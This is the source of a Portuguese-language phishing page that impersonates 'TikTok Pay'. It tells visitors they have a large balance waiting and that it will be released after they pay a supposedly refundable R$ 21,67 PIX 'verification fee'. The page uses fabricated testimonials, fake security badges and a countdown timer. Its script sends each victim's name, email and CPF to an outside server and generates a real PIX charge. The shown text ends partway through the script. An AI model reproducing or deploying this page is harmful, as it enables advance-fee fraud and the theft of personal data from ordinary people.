<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Saque Disponível</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        body { background-color: #f3f4f6; color: #1f2937; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
        .constrained-width { max-width: 32rem; margin-left: auto; margin-right: auto; padding-left: 1rem; padding-right: 1rem; }
        @media (min-width: 640px) { .constrained-width { padding-left: 0; padding-right: 0; } }
        .form-checkbox { -webkit-appearance: none; -moz-appearance: none; appearance: none; padding: 0; -webkit-print-color-adjust: exact; color-adjust: exact; display: inline-block; vertical-align: middle; background-origin: border-box; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; flex-shrink: 0; height: 1rem; width: 1rem; color: #14b8a6; background-color: #fff; border-color: #64748b; border-width: 1px; border-radius: .25rem; }
        .form-checkbox:checked { background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3e%3c/svg%3e"); border-color: transparent; background-color: currentColor; background-size: 100% 100%; background-position: center; background-repeat: no-repeat; }
        #pay-button, .step-nav-btn { transition: opacity 0.2s; }
        #pay-button:disabled, .step-nav-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff2424; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #copy-button { transition: transform 0.1s ease; } #copy-button:active { transform: scale(0.97); }
        .form-step { display: none; animation: fadeIn 0.5s; }
        .form-step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000; border-radius: 0.5rem; }
        .video-container iframe, .video-container video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .prose { color: inherit; } .prose h1, .prose h2, .prose h3, .prose b, .prose strong { color: inherit; } .prose p, .prose ul, .prose ol, .prose i { color: inherit; margin-top: 1em; margin-bottom: 1em; }
        .prose.text-center * { text-align: center; }
        .social-proof-toast {
            background-color: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(5px);
            color: white;
            padding: 12px 16px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1), 0 10px 20px rgba(0,0,0,0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: opacity 0.5s ease-out, transform 0.5s ease-out;
            opacity: 0;
            transform: translateY(20px) scale(0.95);
            margin-top: 10px;
            width: fit-content;
            max-width: 350px;
        }
        .social-proof-toast.show {
            opacity: 1;
            transform: translateY(0) scale(1);
        }
        @keyframes backdropFadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        
 
        .header { background: linear-gradient(135deg, #000000, #1a1a1a); color: white; padding: 1.5rem 1rem; border-radius: 0 0 1rem 1rem; margin-bottom: 1.5rem; }
        .logo { font-size: 1.5rem; font-weight: bold; margin-bottom: 0.5rem; }
        .balance-display { background: white; border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        .balance-amount { font-size: 2.5rem; font-weight: bold; color: #000; margin: 0.5rem 0; }
        .balance-subtitle { color: #666; font-size: 0.9rem; }
        .security-badge { display: inline-flex; align-items: center; gap: 0.5rem; background: #10b981; color: white; padding: 0.5rem 1rem; border-radius: 2rem; font-size: 0.875rem; margin-top: 1rem; }
        
 
        .animated-banner { width: 100%; height: 100px; border-radius: 0.75rem; overflow: hidden; margin: 1rem 0; }
        .animated-banner img { width: 100%; height: 100%; object-fit: cover; }
        
   
        .testimonial-carousel { margin: 2rem 0; }
        .carousel-container { position: relative; overflow: hidden; border-radius: 1rem; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
        .carousel-track { display: flex; transition: transform 0.5s ease; }
        .testimonial-card { min-width: 100%; padding: 1.5rem; box-sizing: border-box; }
        .testimonial-header { display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem; }
        .testimonial-avatar { width: 50px; height: 50px; border-radius: 50%; object-fit: cover; }
        .testimonial-name { font-weight: bold; }
        .testimonial-role { color: #666; font-size: 0.875rem; }
        .testimonial-text { color: #444; line-height: 1.5; }
        .carousel-nav { display: flex; justify-content: center; gap: 0.5rem; margin-top: 1rem; }
        .carousel-dot { width: 8px; height: 8px; border-radius: 50%; background: #ddd; cursor: pointer; transition: background 0.3s; }
        .carousel-dot.active { background: #000; }
        .carousel-arrow { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(255,255,255,0.9); border: none; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .carousel-arrow.prev { left: 10px; }
        .carousel-arrow.next { right: 10px; }
        

        .form-group { margin-bottom: 1.25rem; }
        .form-label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
        .form-input { width: 100%; padding: 0.75rem; border: 1px solid #d1d5db; border-radius: 0.5rem; font-size: 1rem; }
        .form-input:focus { outline: none; border-color: #000; box-shadow: 0 0 0 3px rgba(0,0,0,0.1); }
        
  
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; width: 100%; padding: 1rem; border: none; border-radius: 0.75rem; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.2s; }
        .btn-primary { background: linear-gradient(135deg, #FF0050, #FF3366); color: white; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(255,0,80,0.3); }
        .btn-secondary { background: #e5e7eb; color: #374151; }
        .btn-secondary:hover { background: #d1d5db; }
        

        .qr-container { text-align: center; margin: 1.5rem 0; }
        .qr-code { width: 200px; height: 200px; margin: 0 auto; background: white; padding: 1rem; border-radius: 0.75rem; border: 1px solid #e5e7eb; }
        

        .status { padding: 1rem; border-radius: 0.75rem; text-align: center; font-weight: 600; }
        .status-pending { background: rgba(245, 158, 11, 0.1); color: #f59e0b; }
        .status-success { background: rgba(16, 185, 129, 0.1); color: #10b981; }
        

        .footer { text-align: center; padding: 1.5rem 0; color: #666; font-size: 0.875rem; border-top: 1px solid #e5e7eb; margin-top: 2rem; }
        

        .demo-pix-container {
            background: rgba(0, 242, 234, 0.1);
            border: 2px solid #00F2EA;
            border-radius: 1rem;
            padding: 1.5rem;
            margin: 1.5rem 0;
            text-align: center;
        }
        
        .demo-warning {
            background: rgba(245, 158, 11, 0.1);
            border: 1px solid #F59E0B;
            color: #D97706;
            padding: 1rem;
            border-radius: 0.75rem;
            margin: 1rem 0;
            font-size: 0.875rem;
            text-align: center;
        }
        

        .timer-container {
            background: rgba(0, 242, 234, 0.1);
            border: 1px solid #00F2EA;
            border-radius: 0.75rem;
            padding: 1rem;
            margin: 1rem 0;
            text-align: center;
        }
        
        .timer {
            font-size: 1.5rem;
            font-weight: bold;
            color: #000;
            font-family: monospace;
        }
        
        .progress-bar {
            height: 6px;
            background: #e5e7eb;
            border-radius: 3px;
            margin-top: 0.5rem;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #00F2EA, #FF0050);
            transition: width 1s linear;
        }
        
        .payment-info {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.05), rgba(0, 0, 0, 0.02));
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 1rem;
            padding: 1.5rem;
            margin: 1.5rem 0;
        }
        
        .tax-amount {
            font-size: 2.5rem;
            font-weight: bold;
            color: #000;
            text-align: center;
            margin: 1rem 0;
        }
        
        .badge {
            display: inline-block;
            padding: 0.25rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 600;
        }
        
        .badge-success {
            background: linear-gradient(135deg, #00F2EA, #00C2B8);
            color: #000;
        }
        
        .steps-container {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin: 1.5rem 0;
        }
        
        .step {
            display: flex;
            align-items: flex-start;
            gap: 1rem;
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            min-width: 32px;
            background: linear-gradient(135deg, #FF0050, #FF3366);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 0.875rem;
        }
        
        .step-number.check {
            background: linear-gradient(135deg, #00F2EA, #00C2B8);
        }
        
        .step-content {
            flex: 1;
        }
        
        .step-title {
            font-weight: 600;
            margin-bottom: 0.25rem;
        }
        
        .step-description {
            color: #666;
            font-size: 0.875rem;
        }
        
        .security-icons {
            display: flex;
            justify-content: center;
            gap: 2rem;
            padding: 1.5rem 0;
        }
        
        .security-item {
            text-align: center;
        }
        
        .security-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF0050, #00F2EA);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            margin: 0 auto 0.5rem;
        }
        
        .security-text {
            font-size: 0.75rem;
            color: #666;
        }
        
        /* Estilos para o QR Code real */
        .real-qr-code {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            display: block;
            border-radius: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="constrained-width">
  
        <div class="animated-banner">
            <img alt="Banner da loja Taxa de Validação - Estorno após Pagamento" 
                 fetchpriority="high" 
                 decoding="async" 
                 style="color:transparent" 
                 src="https://d1frh8xn9wll8b.cloudfront.net/1766838695989-1760911468461-zc19fcd3d2lmkj0x9jzqswuot.gif">
        </div>

        <div class="header">
            <div class="logo">TikTok Pay</div>
            <div style="text-align: center;">
                <div style="font-size: 0.9rem; color: #aaa; margin-bottom: 0.5rem;">Taxa de Verificação</div>
                <div style="font-size: 2.5rem; font-weight: bold;">R$ 21,67</div>
                <div style="font-size: 0.9rem; color: #aaa; margin-top: 0.5rem;">Reembolsável em 1 minuto</div>
            </div>
        </div>


        <div class="payment-info">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                <div>
                    <div class="tax-amount">R$ 21,67</div>
                </div>
                <div class="badge badge-success">REEMBOLSÁVEL</div>
            </div>
            
            <div style="text-align: center; color: #666; font-size: 0.875rem; margin-bottom: 1.5rem;">
                Taxa obrigatória para liberação do saque no valor de 
                <span style="font-weight: 600; color: #000;">R$ 4.596,72</span>. 
                O valor de <span style="font-weight: 600; color: #000;">R$ 21,67</span> 
                será reembolsado em <span style="font-weight: 600; color: #000;">1 minuto</span>.
            </div>
        </div>


        <div class="form-step active" id="step1">
            <div style="background: white; border-radius: 1rem; padding: 1.5rem; margin: 1.5rem 0; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
                <h3 style="margin-bottom: 1rem; font-size: 1.25rem; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-user" style="color: #FF0050;"></i>
                    SEUS DADOS
                </h3>
                <div style="color: #666; font-size: 0.875rem; margin-bottom: 1.5rem;">
                    Preencha para gerar o código PIX
                </div>
                
                <form id="paymentForm">
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-user-circle" style="color: #FF0050; margin-right: 0.5rem;"></i>
                            Nome Completo *
                        </label>
                        <input type="text" id="nome-completo" class="form-input" placeholder="Seu nome completo" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-envelope" style="color: #FF0050; margin-right: 0.5rem;"></i>
                            E-mail *
                        </label>
                        <input type="email" id="email-cliente" class="form-input" placeholder="seu@email.com" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">
                            <i class="fas fa-id-card" style="color: #FF0050; margin-right: 0.5rem;"></i>
                            CPF *
                        </label>
                        <input type="text" id="cpf-cliente" class="form-input" placeholder="000.000.000-00" maxlength="14" required>
                    </div>
                    
                    <button type="submit" id="pay-button" class="btn btn-primary" style="margin-top: 1.5rem;">
                        <i class="fas fa-bolt"></i>
                        GERAR CÓDIGO PIX AGORA
                    </button>
                    
                    <div style="text-align: center; margin-top: 1rem; color: #666; font-size: 0.875rem;">
                        <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 0.5rem;">
                            <i class="fas fa-check" style="color: #10b981;"></i>
                            <span>Taxa reembolsável em 1 minuto</span>
                        </div>
                        <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
                            <i class="fas fa-lock" style="color: #10b981;"></i>
                            <span>Dados protegidos por criptografia</span>
                        </div>
                    </div>
                </form>
            </div>
        </div>


        <div id="loading" class="form-step" style="text-align: center; padding: 3rem 0;">
            <div class="loader"></div>
            <div style="margin-top: 1rem;">Gerando código PIX...</div>
        </div>


        <div id="pixPayment" class="form-step">
            <div class="demo-pix-container">
                <h3 style="margin-bottom: 1rem; font-size: 1.25rem; color: #000; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-qrcode" style="color: #00F2EA;"></i>
                    PAGUE COM PIX
                </h3>
                <div style="color: #666; font-size: 0.875rem; margin-bottom: 1rem;">
                    Pedido: <span id="orderId" style="font-weight: 600; color: #000;">#000000</span>
                </div>
                
                <div class="qr-container">
                    <div class="qr-code" id="qrCodeContainer">
                        <!-- QR Code real será inserido aqui -->
                    </div>
                </div>
                
                <div style="margin: 1.5rem 0;">
                    <div style="font-weight: 500; margin-bottom: 0.5rem; color: #000;">Código PIX (Copie e cole):</div>
                    <div id="pixCode" style="background: white; padding: 1rem; border-radius: 0.5rem; font-family: monospace; font-size: 0.875rem; word-break: break-all; border: 1px solid #e5e7eb; color: #000;">
                        Aguardando geração...
                    </div>
                </div>
                
                <button id="copy-button" class="btn btn-secondary">
                    <i class="fas fa-copy"></i>
                    Copiar Código PIX
                </button>
                
        
                <div class="timer-container">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                        <div style="font-size: 0.875rem; color: #666;">Tempo restante:</div>
                        <div id="timeLeft" class="timer">30:00</div>
                    </div>
                    <div class="progress-bar">
                        <div id="progress" class="progress" style="width: 100%"></div>
                    </div>
                    <div style="font-size: 0.75rem; color: #666; margin-top: 0.5rem;">
                        Código válido por 30 minutos
                    </div>
                </div>
                
                <div class="status status-pending" id="paymentStatus" style="margin-top: 1.5rem;">
                    <i class="fas fa-spinner fa-spin"></i>
                    Aguardando pagamento...
                </div>
                
                <div class="demo-warning">
                    ⚠️ <strong>ATENÇÃO:</strong> Este é um PIX real. Ao pagar R$ 21,67, você estará confirmando sua identidade e liberando o saque de R$ 4.596,72.
                </div>
                
                <div style="display: flex; gap: 1rem; margin-top: 1.5rem;">
                    <button id="checkPaymentBtn" class="btn btn-primary" style="flex: 1;">
                        <i class="fas fa-sync-alt"></i>
                        Verificar Pagamento
                    </button>
                    <button id="newPaymentBtn" class="btn btn-secondary" style="flex: 1;">
                        <i class="fas fa-arrow-left"></i>
                        Novo Pagamento
                    </button>
                </div>
            </div>
        </div>

 
        <div style="background: white; border-radius: 1rem; padding: 1.5rem; margin: 1.5rem 0; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
            <h3 style="margin-bottom: 1.5rem; font-size: 1.25rem; display: flex; align-items: center; gap: 0.5rem;">
                <i class="fas fa-list-check" style="color: #FF0050;"></i>
                COMO FUNCIONA
            </h3>
            
            <div class="steps-container">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-content">
                        <div class="step-title">Pagar taxa de confirmação</div>
                        <div class="step-description">R$ 21,67 para verificação de identidade</div>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number check">✓</div>
                    <div class="step-content">
                        <div class="step-title">Receber reembolso automático</div>
                        <div class="step-description">Valor devolvido em 1 minuto</div>
                    </div>
                </div>
                
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-content">
                        <div class="step-title">Acessar saldo completo</div>
                        <div class="step-description">R$ 4.596,72 liberado para saque</div>
                    </div>
                </div>
            </div>
        </div>


        <div class="security-icons">
            <div class="security-item">
                <div class="security-icon">
                    <i class="fas fa-lock"></i>
                </div>
                <div class="security-text">Criptografado</div>
            </div>
            
            <div class="security-item">
                <div class="security-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="security-text">Seguro</div>
            </div>
            
            <div class="security-item">
                <div class="security-icon">
                    <i class="fas fa-bolt"></i>
                </div>
                <div class="security-text">Rápido</div>
            </div>
        </div>


        <div class="testimonial-carousel">
            <h3 style="text-align: center; margin-bottom: 1.5rem; font-size: 1.25rem;">O que estão falando</h3>
            
            <div class="carousel-container">
                <div class="carousel-track" id="carouselTrack">
            
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (4).jpg" alt="Maria" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">Maria Santos</div>
                                <div class="testimonial-role">Criadora de conteúdo</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Paguei a taxa de R$ 21,67 e em menos de 1 minuto recebi o reembolso e meu saque de R$ 2.450 foi liberado! Funciona perfeitamente!"
                        </div>
                    </div>
                    
             
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (3).jpg" alt="João" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">João Silva</div>
                                <div class="testimonial-role">Influenciador digital</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Não acreditava que era verdade mas resolvi arriscar paguei os R$ 21,67 e realmente recebi de volta em segundos. Meu saldo de R$ 3.200 foi liberado na horaaaaa!"
                        </div>
                    </div>
                    
                
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (2).jpg" alt="Ana" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">Ana Oliveira</div>
                                <div class="testimonial-role">Tiktoker</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Estava com medo no início, mas o processo é super seguro. Paguei a taxa, recebi de volta em 50 segundos e consegui sacar meus R$ 1.850. Recomendo!"
                        </div>
                    </div>
                    
            
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <img src="img/imagem (1).jpg" alt="Carlos" class="testimonial-avatar">
                            <div>
                                <div class="testimonial-name">Carlos Mendes</div>
                                <div class="testimonial-role">Produtor de vídeos</div>
                            </div>
                        </div>
                        <div class="testimonial-text">
                            "Finalmente consegui sacar meus R$ 4.100 do TikTok! comprei um play5. E a taxa é devolvida mesmo, não é golpeee!"
                        </div>
                    </div>
                </div>
                
           
                <button class="carousel-arrow prev" onclick="moveCarousel(-1)">
                    <i class="fas fa-chevron-left"></i>
                </button>
                <button class="carousel-arrow next" onclick="moveCarousel(1)">
                    <i class="fas fa-chevron-right"></i>
                </button>
            </div>
            
      
            <div class="carousel-nav" id="carouselNav">
                <span class="carousel-dot active" onclick="goToSlide(0)"></span>
                <span class="carousel-dot" onclick="goToSlide(1)"></span>
                <span class="carousel-dot" onclick="goToSlide(2)"></span>
                <span class="carousel-dot" onclick="goToSlide(3)"></span>
            </div>
        </div>

 
        <div class="footer">
            <div>© 2024 TikTok Pay • Processamento seguro via PIX</div>
            <div style="margin-top: 0.5rem; font-size: 0.75rem; color: #999;">
                Este site não é afiliado ao TikTok. É um processador de pagamentos independente.
            </div>
        </div>
    </div>

    <script>
        // Variáveis globais
        let currentSlide = 0;
        const totalSlides = 4;
        let timerInterval = null;
        let currentTransactionId = null;
        
        // URL DA API REAL
        const API_URL = 'https://tiktok-pix-real.onrender.com/api/pix/create';
        const API_CHECK_URL = 'https://tiktok-pix-real.onrender.com/api/pix/check';

        // Funções do carrossel
        function moveCarousel(direction) {
            const track = document.getElementById('carouselTrack');
            const dots = document.querySelectorAll('.carousel-dot');
            
            currentSlide += direction;
            
            if (currentSlide < 0) {
                currentSlide = totalSlides - 1;
            } else if (currentSlide >= totalSlides) {
                currentSlide = 0;
            }
            
            track.style.transform = `translateX(-${currentSlide * 100}%)`;
            
            // Atualiza dots
            dots.forEach((dot, index) => {
                dot.classList.toggle('active', index === currentSlide);
            });
        }
        
        function goToSlide(index) {
            currentSlide = index;
            const track = document.getElementById('carouselTrack');
            const dots = document.querySelectorAll('.carousel-dot');
            
            track.style.transform = `translateX(-${currentSlide * 100}%)`;
            
            // Atualiza dots
            dots.forEach((dot, i) => {
                dot.classList.toggle('active', i === currentSlide);
            });
        }

        // Função para formatar CPF
        function formatarCPF(cpf) {
            cpf = cpf.replace(/\D/g, '');
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }

        // Máscara para CPF
        document.getElementById('cpf-cliente')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length > 11) {
                value = value.substring(0, 11);
            }
            
            if (value.length > 9) {
                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            } else if (value.length > 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
            } else if (value.length > 3) {
                value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
            }
            
            e.target.value = value;
        });

        // Função para mostrar/ocultar steps
        function showStep(stepId) {
            // Oculta todos os steps
            document.querySelectorAll('.form-step').forEach(step => {
                step.classList.remove('active');
            });
            
            // Mostra o step solicitado
            const stepElement = document.getElementById(stepId);
            if (stepElement) {
                stepElement.classList.add('active');
                
                // Rola para o topo do step
                stepElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        }

        // Função para gerar QR Code real usando uma biblioteca externa
        function gerarQRCodeReal(codigoPix, containerId) {
            const container = document.getElementById(containerId);
            container.innerHTML = '';
            
            // Se tiver uma URL de imagem da API, use-a
            if (codigoPix.qrcode_image) {
                const img = document.createElement('img');
                img.src = codigoPix.qrcode_image;
                img.alt = 'QR Code PIX';
                img.className = 'real-qr-code';
                container.appendChild(img);
                return;
            }
            
            // Caso contrário, gere um QR Code com uma biblioteca
            // Você pode usar uma biblioteca como qrcode.js
            // Aqui está um exemplo usando um serviço online (para produção, use uma biblioteca local)
            if (codigoPix.qrcode) {
                const qrImg = document.createElement('img');
                qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(codigoPix.qrcode)}`;
                qrImg.alt = 'QR Code PIX';
                qrImg.className = 'real-qr-code';
                container.appendChild(qrImg);
            }
        }

        // Função principal para gerar PIX real
        async function gerarPixReal(nome, email, cpf) {
            // Validação básica
            if (!nome || nome.trim().length < 3) {
                alert('Por favor, informe seu nome completo!');
                return null;
            }
            
            if (!email || !email.includes('@') || !email.includes('.')) {
                alert('Por favor, informe um e-mail válido!');
                return null;
            }
            
            cpf = cpf.replace(/\D/g, '');
            if (cpf.length !== 11) {
                alert('Por favor, informe um CPF válido com 11 dígitos!');
                return null;
            }
            
            try {
                // Mostra loading
                showStep('loading');
                
                const resposta = await fetch(API_URL, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        customerName: nome.trim(),
                        customerEmail: email.trim(),
                        customerCpf: cpf
                    })
                });
                
                const resultado = await resposta.json();
                
                if (resultado.success && resultado.pix) {
                    return resultado.pix;
                } else {
                    alert('❌ Erro ao gerar PIX: ' + (resultado.error || 'Tente novamente'));
                    showStep('step1');
                    return null;
                }
            } catch (error) {
                console.error('Erro na API:', error);
                alert('❌ Erro de conexão com o servidor. Tente novamente.');
                showStep('step1');
                return null;
            }
        }

        // Função para verificar pagamento real
        async function verificarPagamentoReal(transactionId) {
            if (!transactionId) return false;
            
            try {
                const resposta = await fetch(`${API_CHECK_URL}/${transactionId}`, {
                    method: 'GET',
                    headers: { 
                        'Content-Type': 'application/json'
                    }
                });
                
                const resultado = await resposta.json();
                return resultado.success && resultado.paid === true;
            } catch (error) {
                console.error('Erro ao verificar pagamento:', error);
                return false;
            }
        }

        // Função para iniciar timer
        function iniciarTimer(minutos = 30) {
            // Limpa timer anterior se existir
            if (timerInterval) {
                clearInterval(timerInterval);
            }
            
            let segundos = minutos * 60;
            const timerElement = document.getElementById('timeLeft');
            const progressElement = document.getElementById('progress');
            
            timerInterval = setInterval(() => {
                segundos--;
                
                if (segundos < 0) {
                    clearInterval(timerInterval);
                    timerElement.textContent = '00:00';
                    progressElement.style.width = '0%';
                    
                    // Mostra alerta de expiração
                    const statusElement = document.getElementById('paymentStatus');
                    statusElement.innerHTML = '<i class="fas fa-clock"></i> Código PIX expirado';
                    statusElement.className = 'status status-pending';
                    
                    return;
                }
                
                const minutosRestantes = Math.floor(segundos / 60);
                const segundosRestantes = segundos % 60;
                
                timerElement.textContent = 
                    `${minutosRestantes.toString().padStart(2, '0')}:${segundosRestantes.toString().padStart(2, '0')}`;
                
                // Atualiza progresso
                const progresso = (segundos / (minutos * 60)) * 100;
                progressElement.style.width = `${progresso}%`;
                
            }, 1000);
        }

        // Evento de submit do formulário
        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Desabilita o botão para evitar múltiplos cliques
            const submitBtn = document.getElementById('pay-button');
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GERANDO...';
            
            try {
                // Coleta dados
                const nome = document.getElementById('nome-completo').value;
                const email = document.getElementById('email-cliente').value;
                const cpf = document.getElementById('cpf-cliente').value;
                
                // Gera PIX real
                const pixData = await gerarPixReal(nome, email, cpf);
                
                if (pixData) {
                    // Armazena o ID da transação
                    currentTransactionId = pixData.id || pixData.transaction_id;
                    
                    // Atualiza a interface com os dados do PIX
                    document.getElementById('orderId').textContent = `#${currentTransactionId || 'PIX' + Date.now().toString().slice(-6)}`;
                    
                    // Gera QR Code real
                    gerarQRCodeReal(pixData, 'qrCodeContainer');
                    
                    // Mostra o código PIX
                    if (pixData.qrcode) {
                        document.getElementById('pixCode').textContent = pixData.qrcode;
                    } else if (pixData.copy_paste_code) {
                        document.getElementById('pixCode').textContent = pixData.copy_paste_code;
                    }
                    
                    // Inicia timer
                    iniciarTimer(30);
                    
                    // Mostra step do PIX
                    showStep('pixPayment');
                    
                    // Abre QR Code em nova janela se tiver URL
                    if (pixData.pix_url) {
                        setTimeout(() => {
                            window.open(pixData.pix_url, 'PIX_TIKTOK', 'width=400,height=600');
                        }, 1000);
                    }
                    
                    // Envia dados para analytics ou backend (opcional)
                    console.log('PIX gerado com sucesso:', {
                        transactionId: currentTransactionId,
                        nome: nome,
                        email: email,
                        timestamp: new Date().toISOString()
                    });
                }
            } catch (error) {
                console.error('Erro no processo:', error);
                alert('Ocorreu um erro inesperado. Tente novamente.');
            } finally {
                // Reabilita o botão
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> GERAR CÓDIGO PIX AGORA';
            }
        });

        // Botão copiar código PIX
        document.getElementById('copy-button').addEventListener('click', function() {
            const pixCodeText = document.getElementById('pixCode').textContent;
            
            if (pixCodeText && pixCodeText !== 'Aguardando geração...') {
                navigator.clipboard.writeText(pixCodeText).then(() => {
                    // Feedback visual
                    const originalText = this.innerHTML;
                    this.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
                    this.style.background = 'linear-gradient(135deg, #00F2EA, #00C2B8)';
                    
                    setTimeout(() => {
                        this.innerHTML = originalText;
                        this.style.background = '';
                    }, 2000);
                }).catch(err => {
                    console.error('Erro ao copiar:', err);
                    // Fallback para seleção manual
                    const pixCodeElement = document.getElementById('pixCode');
                    const range = document.createRange();
                    range.selectNodeContents(pixCodeElement);
                    const selection = window.getSelection();
                    selection.removeAllRanges();
                    selection.addRange(range);
                    alert('Texto selecionado. Pressione Ctrl+C para copiar.');
                });
            }
        });

        // Botão verificar pagamento
        document.getElementById('checkPaymentBtn').addEventListener('click', async function() {
            const statusElement = document.getElementById('paymentStatus');
            const checkBtn = this;
            
            if (!currentTransactionId) {
                alert('Nenhuma transação encontrada. Gere um novo PIX.');
                return;
            }
            
            // Desabilita botão temporariamente
            checkBtn.disabled = true;
            checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFICANDO...';
            statusElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando pagamento...';
            
            try {
                // Verifica pagamento real na API
                const pagamentoConfirmado = await verificarPagamentoReal(currentTransactionId);
                
                if (pagamentoConfirmado) {
                    statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
                    statusElement.className = 'status status-success';
                    
                    // Para produção real, aqui você faria:
                    // 1. Registrar o pagamento no seu banco de dados
                    // 2. Enviar e-mail de confirmação
                    // 3. Processar o próximo passo do fluxo
                    
                    alert('✅ Pagamento confirmado com sucesso! O processo de reembolso e liberação do saque será iniciado automaticamente.');
                    
                    // Opcional: Redirecionar para página de sucesso
                    // window.location.href = '/sucesso.html';
                    
                } else {
                    statusElement.innerHTML = '<i class="fas fa-clock"></i> Aguardando pagamento...';
                    statusElement.className = 'status status-pending';
                    alert('⏳ Pagamento ainda não identificado. Aguarde alguns minutos e tente novamente.');
                }
            } catch (error) {
                console.error('Erro na verificação:', error);
                statusElement.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erro na verificação';
                alert('❌ Erro ao verificar pagamento. Tente novamente em alguns instantes.');
            } finally {
                // Reabilita o botão
                checkBtn.disabled = false;
